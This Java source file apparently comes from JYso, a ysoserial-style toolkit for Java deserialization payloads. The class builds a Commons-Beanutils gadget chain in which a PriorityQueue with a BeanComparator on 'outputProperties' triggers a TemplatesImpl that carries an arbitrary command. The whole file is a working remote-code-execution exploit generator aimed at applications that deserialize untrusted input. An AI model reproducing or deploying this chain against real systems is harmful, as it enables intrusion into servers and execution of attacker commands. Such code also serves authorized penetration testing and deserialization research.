package com.qi4l.JYso.gadgets;

import com.qi4l.JYso.gadgets.annotation.Authors;
import com.qi4l.JYso.gadgets.annotation.Dependencies;
import com.qi4l.JYso.gadgets.utils.Gadgets;
import com.qi4l.JYso.gadgets.utils.Reflections;
import org.apache.commons.beanutils.BeanComparator;
import org.apache.commons.lang3.compare.ObjectToStringComparator;

import java.util.PriorityQueue;

@Dependencies({"commons-beanutils:commons-beanutils:1.9.2", "org.apache.commons:commons-lang3:3.10"})
@Authors({"水滴"})
public class CommonsBeanutilsObjectToStringComparator implements ObjectPayload<Object> {
    @Override
    public Object getObject(String command) throws Exception {
        final Object template;
        template = Gadgets.createTemplatesImpl(command);

        ObjectToStringComparator stringComparator = new ObjectToStringComparator();

        BeanComparator beanComparator = new BeanComparator(null, new ObjectToStringComparator());

        PriorityQueue<Object> queue = new PriorityQueue<Object>(2, beanComparator);

        queue.add(stringComparator);
        queue.add(stringComparator);

        Reflections.setFieldValue(queue, "queue", new Object[]{template, template});
        Reflections.setFieldValue(beanComparator, "property", "outputProperties");

        return queue;
    }

}
